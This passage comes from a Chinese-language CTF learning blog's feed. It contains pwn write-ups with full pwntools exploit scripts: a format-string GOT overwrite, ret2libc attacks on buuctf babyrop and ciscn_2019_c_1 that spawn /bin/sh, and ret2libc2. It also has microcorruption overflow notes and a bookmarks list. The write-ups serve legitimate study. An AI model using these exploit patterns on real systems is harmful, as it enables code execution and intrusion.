p.sendline(name)<br><br>//泄露puts_got里的内容，及puts函数在该程序中的真正地址<br>input_file(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">b&#x27;%8$s&#x27;</span>+p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>output_file(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>//recv的内容前<span class="hljs-number">4</span>个小端序字符为puts函数地址，后面的字符均为格式化字符串中%s后面的内容<br>puts_addr=u32(p.recv()[:<span class="hljs-number">4</span>])<br>log.success(<span class="hljs-string">&#x27;puts got:&#x27;</span>+<span class="hljs-built_in">hex</span>(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br><br>//使用libcSearcher找到system函数的真正地址<br>libc=LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span> ,puts_addr)<br>system_offset=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>system_addr=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)+system_offset<br><br>//自动生成payload，这里的格式化字符串属于printf函数的第<span class="hljs-number">7</span>个参数<br>payload=fmtstr_payload(<span class="hljs-number">7</span>, &#123;elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]: system_addr&#125;)<br>input_file(<span class="hljs-string">&#x27;1&#x27;</span>,payload)<br>output_file(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recv()<br>log.success(<span class="hljs-string">&#x27;sys_addr:&#x27;</span>+<span class="hljs-built_in">hex</span>(system_addr))<br><br>//输入一个文件名为/<span class="hljs-built_in">bin</span>/sh;的文件，当show_dir时会运行puts(/<span class="hljs-built_in">bin</span>/sh;)，即system(/<span class="hljs-built_in">bin</span>/sh;)<br>input_file(<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;dir&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>知识点</p><p>1、字符串偏移计算</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">input<span class="hljs-constructor">_file(&#x27;1&#x27;,&#x27;AAAA%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>&#x27;)</span><br>output<span class="hljs-constructor">_file(&#x27;1&#x27;)</span><br>print(p.recv<span class="hljs-literal">()</span>)<br></code></pre></td></tr></table></figure><p><img src="/5.png"></p><p>即第七个。</p><p>2、libcsearcher的使用，不知道什么原因无法直接使用，提示no moudle named ‘libcsearcher’，上网搜到的方法没能解决，将程序与py文件复制到&#x2F;libcsearcher下后可正常使用。</p><p>3、关于got表，在看了一些书和资料后大概明白，在程序地址随机化时，函数的got地址指向的空间内存着函数在该程序中真正的地址，因此</p><p>①泄露时%p泄露的是got地址，%s泄露的是got地址指向的内容，即真正地址。</p><p>②使用libcsearcher进行配对的是got地址，got地址与libc库有关，而函数真正地址会随机化。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>记录我对我的虚拟机都做了些什么</title>
    <link href="/2021/07/13/%E8%AE%B0%E5%BD%95%E6%88%91%E5%AF%B9%E6%88%91%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%83%BD%E5%81%9A%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88/"/>
    <url>/2021/07/13/%E8%AE%B0%E5%BD%95%E6%88%91%E5%AF%B9%E6%88%91%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%83%BD%E5%81%9A%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88/</url>
    
    <content type="html"><![CDATA[<p>7.13 </p><p>更改nat模式</p><p>设置proxychains4，修改了conf文件</p><p>修改了Firefox代理设置</p><p>7.26</p><p>修改了gdbinit文件，使pwndbg可以使用pwngdb功能</p><p>9.22</p><p>使用apt安装libc时提示404 not found，解决方法apt update</p><p>10.10</p><p>复制需要的libc版本内的.debug文件夹到另一个路径，并更改了gdb-file</p><p><code>set debug-file-directory debug/</code></p><p>2021.1.24</p><p>更新公钥</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">sudo gpg <span class="hljs-comment">--keyserver pgpkeys.mit.edu --recv-key 467B942D3A79BD29</span><br>sudo gpg -<span class="hljs-keyword">a</span> <span class="hljs-comment">--export 467B942D3A79BD29 | sudo apt-key add - </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>microcorruption</title>
    <link href="/2021/05/26/microcorruption/"/>
    <url>/2021/05/26/microcorruption/</url>
    
    <content type="html"><![CDATA[<p>前两题忘记记下来了，反正很容易就不写了</p><h2 id="Sydney"><a href="#Sydney" class="headerlink" title="Sydney"></a>Sydney</h2><h4 id=""><a href="#" class="headerlink" title=""></a><img src="/1.png"></h4><p>这里是逐一比较，一开始按照顺序来写不对，卡了一下，看了题解应该是数据存储应该是高位在后面，就是要6750倒过来写5067，很容易忘记的基础知识点了orz。</p><h2 id="Hanoi"><a href="#Hanoi" class="headerlink" title="Hanoi"></a>Hanoi</h2><p><img src="/2.png"></p><p>这里是要比较0x2e和0x2410地址里的东西是否一样，一样就可以过，前面可以随便填</p><h2 id="Cusco"><a href="#Cusco" class="headerlink" title="Cusco"></a>Cusco</h2><p><img src="/3.png"></p><p>不能让r15&#x3D;0，就往前面函数看看</p><p><img src="/4.png"></p><p>不管前面输入什么，到这两句r15都会变为0，因此不能单纯靠写答案过这题，看了看题解应该是要用栈溢出来操作。</p><p><img src="/5.png"></p><p>当执行到login函数的ret指令时，sp处于我们可以覆盖的位置，因此可以把这个位置写成我们需要跳转的地址<unlock_door>0x4446,因此选择16位输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4644，就过啦！</p><h2 id="Reykjavik"><a href="#Reykjavik" class="headerlink" title="Reykjavik"></a>Reykjavik</h2><p>照例输入aaaaaaaaaaaa运行一下，当sp运行到password开始的地方，留意汇编指令</p><p><img src="/10.png"></p><p>这里需要比较0x6cd1和0x43fe-0x24&#x3D;0x43da的内容，也就是password的第一组数字，因此password先直接输d16c，然后就发现过了。</p><p>其实这一题做的时候并没有这么简单，当时是发现了程序的汇编码在内存里面，只能一条一条去看，并且看见enc的函数名，以为是要一条一条解密的，后来实在撂不清2400后面的程序整个的逻辑，去找了题解顺着做才发现这条重要指令，对汇编指令还是不够敏感，还得继续努力orz。</p><h2 id="Whitehorse"><a href="#Whitehorse" class="headerlink" title="Whitehorse"></a>Whitehorse</h2><p>这道题出现栈溢出的地方是程序最后的ret那里</p><p><img src="/13.png"></p><p>因为之前习惯于在最后判定结果前找漏洞，找这个ret找了很久，最后是在栈溢出的地方填需要跳转的地址，这里没有unlock函数，但是在conditional_xxx函数里有一个call<int>，我们可以填充参数0x7f进去，就能unlock。</p><h2 id="Montevideo"><a href="#Montevideo" class="headerlink" title="Montevideo"></a>Montevideo</h2><p>跟上一题是一模一样的。</p><h2 id="Johannesburg"><a href="#Johannesburg" class="headerlink" title="Johannesburg"></a>Johannesburg</h2><p><img src="/14.png"></p><p>这里是一个cananry，因此sp+11地址的值应该等于30，才能绕过，同时填充我们要的返回地址0x4446就行。</p><h2 id="Santa-Cruz"><a href="#Santa-Cruz" class="headerlink" title="Santa Cruz"></a>Santa Cruz</h2><p><img src="/15.png"></p><p>这里不能使之为0，一步一步推。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-babyrop</title>
    <link href="/2021/04/22/buuctf-babyrop/"/>
    <url>/2021/04/22/buuctf-babyrop/</url>
    
    <content type="html"><![CDATA[<p>先checksec</p><p><img src="/1.png"></p><p>然后ida，为了自己看起来清晰改了下函数名。</p><p><img src="/2.png"></p><p>第一个是计时函数，超过时间就会退出程序。第二个函数如图</p><p><img src="/3.png"></p><p>这里我们要做的是在read buf的时候，第一个字符为\0，这样后面的strncmp的v1就是0，就能成功return buf[7]，在第三个函数中，就可以read的字符数为buf[7]，buf的大小是231，要令他栈溢出，就要让buf[7]的值大于231，那么如何才能让一个char值大于231……困扰了我一下，还是看别人的wp，然后才发现原来可以直接输入‘\255’[手动狗头]，又学到了许多。</p><p>然后是找system和binsh，毫无意外的并没有，并且题目附件还给了libc文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br>context.<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;i386&#x27;</span><br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-attribute">sl</span>=lambda x:io.sendline(x)<br><span class="hljs-attribute">rl</span>=lambda :io.recvline()<br><br><span class="hljs-comment">#io=remote(&#x27;node3.buuoj.cn&#x27;,27293)</span><br><span class="hljs-attribute">io</span>=process(&#x27;./pnn&#x27;)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./pnn&#x27;)<br><span class="hljs-attribute">libc</span>=ELF(&#x27;./libc-2.23.so&#x27;)<br><br><span class="hljs-attribute">main</span>=0x8048825<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;\0&#x27;</span>*7+&#x27;\255&#x27;<br>sl(payload)#<br>rl()#<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0xe7+4)+p32(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(main)+p32(1)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(4)<br>sl(payload)<br><br><span class="hljs-attribute">write_got</span>=u32(io.recv(4))<br><span class="hljs-attribute">libc_base</span>=write_got-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;\0&#x27;</span>*7+&#x27;\255&#x27;<br>sl(payload)#<br>rl()#<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0xe7+4)+p32(libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])+p32(0)+p32(libc_base+libc.search(<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>).next())<br>sl(payload)<br>gdb.attach(io)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>libc.search(‘&#x2F;bin&#x2F;sh\0’).next()中的next()是因为search会出来不止一个，我们只需要第一个，所以用next()</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>收藏一些网站</title>
    <link href="/2021/04/20/%E6%94%B6%E8%97%8F%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99/"/>
    <url>/2021/04/20/%E6%94%B6%E8%97%8F%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<h4 id="关于got表与plt表-x2F-libc库-x2F-动态链接知识"><a href="#关于got表与plt表-x2F-libc库-x2F-动态链接知识" class="headerlink" title="关于got表与plt表&#x2F;libc库&#x2F;动态链接知识"></a>关于got表与plt表&#x2F;libc库&#x2F;动态链接知识</h4><p><a href="https://bkfish.github.io/2019/09/18/%E4%BB%8Eret2libc%E4%B8%AD%E5%AD%A6%E4%B9%A0GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%8A%A8%E6%80%81%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB/">https://bkfish.github.io/2019/09/18/%E4%BB%8Eret2libc%E4%B8%AD%E5%AD%A6%E4%B9%A0GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%8A%A8%E6%80%81%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB/</a></p><p><a href="https://www.wangan.com/docs/516">https://www.wangan.com/docs/516</a></p><h4 id="对wiki的补充知识"><a href="#对wiki的补充知识" class="headerlink" title="对wiki的补充知识"></a>对wiki的补充知识</h4><p><a href="https://blog.csdn.net/qq_33948522/article/details/93880812">https://blog.csdn.net/qq_33948522/article/details/93880812</a></p><h4 id="基本工具知识文档"><a href="#基本工具知识文档" class="headerlink" title="基本工具知识文档"></a>基本工具知识文档</h4><p>pwntools</p><p><a href="https://docs.pwntools.com/en/stable/index.html">https://docs.pwntools.com/en/stable/index.html</a></p><p>gdb</p><p><a href="https://introspelliam.github.io/2017/08/03/pwn/gdb%E7%9A%84%E8%B0%83%E8%AF%95%E4%B8%8E%E4%BD%BF%E7%94%A8/">https://introspelliam.github.io/2017/08/03/pwn/gdb%E7%9A%84%E8%B0%83%E8%AF%95%E4%B8%8E%E4%BD%BF%E7%94%A8/</a></p><h4 id="springboot学习"><a href="#springboot学习" class="headerlink" title="springboot学习"></a>springboot学习</h4><p><a href="https://www.jianshu.com/p/3d788198efab">https://www.jianshu.com/p/3d788198efab</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1282386201411617">https://www.liaoxuefeng.com/wiki/1252599548343744/1282386201411617</a></p><h4 id="python爬虫"><a href="#python爬虫" class="headerlink" title="python爬虫"></a>python爬虫</h4><p><a href="https://www.cnblogs.com/OliverQin/p/12571022.html">https://www.cnblogs.com/OliverQin/p/12571022.html</a></p><h4 id="pwn学习"><a href="#pwn学习" class="headerlink" title="pwn学习"></a>pwn学习</h4><p>一个很适合入门pwn的网站<a href="https://microcorruption.com/">https://microcorruption.com/</a></p><h4 id="linux-pwn学习"><a href="#linux-pwn学习" class="headerlink" title="linux-pwn学习"></a>linux-pwn学习</h4><p>厘清PIE和ASLR的关系<a href="https://www.cnblogs.com/rec0rd/p/7646857.html">https://www.cnblogs.com/rec0rd/p/7646857.html</a></p><h4 id="解决配置问题的小资料"><a href="#解决配置问题的小资料" class="headerlink" title="解决配置问题的小资料"></a>解决配置问题的小资料</h4><p>1、git clone &#x2F;GnuTLS recv error <a href="https://blog.csdn.net/songtianlun/article/details/115611734">https://blog.csdn.net/songtianlun/article/details/115611734</a></p><h2 id="Android、Java、python、mySQL开发"><a href="#Android、Java、python、mySQL开发" class="headerlink" title="Android、Java、python、mySQL开发"></a>Android、Java、python、mySQL开发</h2><p>Android不能在主线程进行网络操作，不能在主线程之外进行UI操作。</p><p>1、JDBC-Android-mySQL<a href="https://blog.csdn.net/pjlddn/article/details/114759789">https://blog.csdn.net/pjlddn/article/details/114759789</a></p><p>2、PHP-Android-mySQL<a href="https://blog.csdn.net/u012811078/article/details/53367139">https://blog.csdn.net/u012811078/article/details/53367139</a></p><p>3、Android实时折线图<a href="https://blog.csdn.net/d276031034/article/details/65437293">https://blog.csdn.net/d276031034/article/details/65437293</a></p><p>4、Python-mysql-传感器数据<a href="https://blog.csdn.net/qq_43433255/article/details/86767399?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164560263916780366539399%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164560263916780366539399&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-7-86767399.pc_search_insert_es_download&utm_term=%E4%BC%A0%E6%84%9F%E5%99%A8%E9%87%87%E9%9B%86%E6%95%B0%E6%8D%AEpython123&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_43433255/article/details/86767399?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164560263916780366539399%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164560263916780366539399&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-7-86767399.pc_search_insert_es_download&amp;utm_term=%E4%BC%A0%E6%84%9F%E5%99%A8%E9%87%87%E9%9B%86%E6%95%B0%E6%8D%AEpython123&amp;spm=1018.2226.3001.4187</a></p><p>5、Android-服务器socket教程<a href="https://www.runoob.com/w3cnote/android-tutorial-socket1.html">https://www.runoob.com/w3cnote/android-tutorial-socket1.html</a></p><p>6、Java线程池<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1306581130018849">https://www.liaoxuefeng.com/wiki/1252599548343744/1306581130018849</a></p><p>7、Android-mqtt连接教程<a href="https://blog.csdn.net/BADAO_LIUMANG_QIZHI/article/details/112461516">https://blog.csdn.net/BADAO_LIUMANG_QIZHI/article/details/112461516</a></p><p>8、关于python包的知识<a href="https://zhuanlan.zhihu.com/p/276461821">https://zhuanlan.zhihu.com/p/276461821</a></p><h2 id="Flask开发"><a href="#Flask开发" class="headerlink" title="Flask开发"></a>Flask开发</h2><p>1、debug mode on：<a href="https://blog.csdn.net/Deng872347348/article/details/124270963">https://blog.csdn.net/Deng872347348/article/details/124270963</a></p><h2 id="Linux操作系统"><a href="#Linux操作系统" class="headerlink" title="Linux操作系统"></a>Linux操作系统</h2><p>1、阅读linux内核源码<a href="https://elixir.bootlin.com/linux/latest/source">https://elixir.bootlin.com/linux/latest/source</a></p>]]></content>
    
    
    <categories>
      
      <category>智能学习机器人</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_c_1</title>
    <link href="/2021/03/27/ciscn-2019-c-1/"/>
    <url>/2021/03/27/ciscn-2019-c-1/</url>
    
    <content type="html"><![CDATA[<p>大概有一周这样没做题了，这周主要在学习基础一点的理论，学校课业也慢慢变多了（特别是程序设计作业，杀了我吧），挤了一点时间读wiki的ROP部分，被有bug和文不对题的题目折磨了好些时间，里面有些概念也需要另外找资料补充，就看得贼慢，一个下午才搞懂一两个知识点，不过总归还是有收获的，慢慢来就都能学会的orz。</p><p>然后wiki上的题直接复现感觉有很多疑点，包括一些偏移地址的知识和脚本的一些功能都搞不太清楚，就还是先上buuctf做下题。</p><p>先checksec嘛，是64位的！</p><p><img src="/1.png"></p><p>然后就康康ida</p><p><img src="/2.png"></p><p>显然，输入1进入encrypt函数，然后就能在里面发现一个gets（），这里会将输入的payload加密，注意到v0，可以在payload的开头放一个\0，就能绕过加密。网上也有wp说经过两次异或就能变回原数据，但是明显\0更加省心。</p><p><img src="/3.png"></p><p>这里我用cyclic计算偏移地址的时候，奇怪地报错了（关于一报错就手无足措这件事），就通过s【rsp+0h】【rbp-50h】算出偏移量应该是50*16+8&#x3D;88，第一个字符应该是\0，那么填充的垃圾数据应该是87个。接下来因为没有system和&#x2F;bin&#x2F;sh，就得用ret2libc，又因为是64位程序，参数储存在寄存器中，就应该找到gadget，这里用的是ret2csu。</p><p><img src="/4.png"></p><p>这里先调用一次loc_400c76，再调用一次loc_400c60，就能先依次pop，使rdx&#x3D;r13，rsi&#x3D;r14，edi&#x3D;r15d（只有低位8字节噢），然后会call[r12+rbx*8]这个地址指向的函数地址，因此要让这个地址不指向任一个地址，才能跳转到后面，cmp rbx,rbp，因此要让rbx&#x3D;rbp也就是pop的时候让rbp&#x3D;rbx+1，紧接再次把需要的数据pop进寄存器里，就能实现存储参数进寄存器，就能顺利调用需要的函数。</p><p>……</p><p>以上是第一条思路，紧接着就想到了明明可以直接使用ROPgadget &#x3D;-&#x3D;我人傻了</p><p>然后就找一下</p><p>64位程序中，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p><p>puts只有一个参数，就找rdi就行，比起csu直接难度跳水orz</p><p><img src="/6.png"></p><p>接着是找puts的plt地址，泄露got地址找到匹配的libc版本，然后就能通过libc找到system和&#x2F;bin&#x2F;sh，ida就能找到</p><p><img src="/5.png"></p><p>那么就能写exp啦</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br>content = 0<br>context(<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>, <span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>ret = 0x4006b9<br>elf = ELF(<span class="hljs-string">&#x27;ciscn_2019_c_1&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&quot;main&quot;</span>]<br><br>pop_rdi_ret = 0x400c83<br><br><br>def main():<br><span class="hljs-keyword">if</span> content == 1:<br>p = process(<span class="hljs-string">&#x27;ciscn_2019_c_1&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,27421)<br><br>payload = b<span class="hljs-string">&#x27;a&#x27;</span> * (0x50 + 8)<br>payload = payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>#<span class="hljs-built_in">print</span>(payload)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Input your choice!\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>p.recvline()<br>puts_addr = u64(p.recv(7)[:-1].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(puts_addr)<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br><br>libc_base   = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr  = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * (0x50 + 8)<br>payload = payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Input your choice!\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)<br><br>p.interactive()<br><br>main()<br></code></pre></td></tr></table></figure><p>关于这一题的一些小插曲，其实这一题包括前面其实我已经看了蛮多的ret2libc题目了，在hgame的时候是搜别人的wp的时候第一次搜到这个题型，也仿照别人的wp来写，但是无论如何都无法写对，在hgame的时候心理各方面压力也有点大，也不敢花太多时间深究，hgame结束后的三月份，重新一点一点地去看wiki学习，重新学到这部分才有了比较好的理解，但是wiki上提供的题目似乎是有问题的，返回的地址跟我找别人的wp的地址并不一样，直到做到这个题，我自己写的程序仍然没办法得出正确结果时，我使用了别人的exp来运行仍然报错，我才发现是我的libcsearcher安装得有问题，为此甚至花费了挺长的时间，libcsearcher安装也巨慢，关于这个事情，只能说是解决问题的经验还不够多orz，大概也有一种害怕遇到问题的心理存在，不过只要有进步就是好的，之后要更有解决问题的勇气才行。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2libc2</title>
    <link href="/2021/03/14/ret2libc2/"/>
    <url>/2021/03/14/ret2libc2/</url>
    
    <content type="html"><![CDATA[<p>先checksec，还是开了NX，就不能用shellcode了。</p><p><img src="/4.png"></p><p>看ida</p><p><img src="/1.png"></p><p>gets存在栈溢出漏洞，cyclic计算一下地址偏移量</p><p><img src="/2.png"></p><p>偏移地址仍然是112，那么填充112个垃圾数据就能劫持返回地址。</p><p><img src="/3.png"></p><p>在ida里看到有system的plt地址，但是没有找到&#x2F;bin&#x2F;sh，所以要手动把&#x2F;bin&#x2F;sh填充进去，然后有了binsh的地址，就能作为system的参数，这样就变成了ret2libc1。</p><p>然后是写ROPgadgets再次调用gets，把&#x2F;bin&#x2F;sh输入bss段里，这里bss段刚好有一个buf2可以放。</p><p><img src="/6.png"></p><p>接下来是找到gets的地址。</p><p><img src="/5.png"></p><p>就可以写exp啦</p><p>这里有两种方法，参见<a href="https://www.jianshu.com/p/c4780335b842">https://www.jianshu.com/p/c4780335b842</a></p><p>第二种用到栈堆平衡，就要先把gets的参数pop出来，pop到哪都无所谓，所以就ROP找一找pop的指令</p><p><img src="/7.png"></p><p>随便用一个短的pop ebx</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>gdb.attach(p)<br><br>system_plt = <span class="hljs-number">0x08048490</span><br>gets_plt = <span class="hljs-number">0x08048460</span><br>buf2 = <span class="hljs-number">0x0804a080</span><br>pop_ebx = <span class="hljs-number">0x0804843d</span><br>p.recvuntil(<span class="hljs-string">&#x27;What do you think ?&#x27;</span>)<br># payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + p32(gets_plt) +p32(system_plt) +p32(buf2)+ p32(buf2)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + p32(gets_plt) + p32(pop_ebx) + p32(buf2) + p32(system_plt) +<span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span> + p32(buf2)<br>p.send(payload)<br>p.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2libc1</title>
    <link href="/2021/03/10/ret2libc1/"/>
    <url>/2021/03/10/ret2libc1/</url>
    
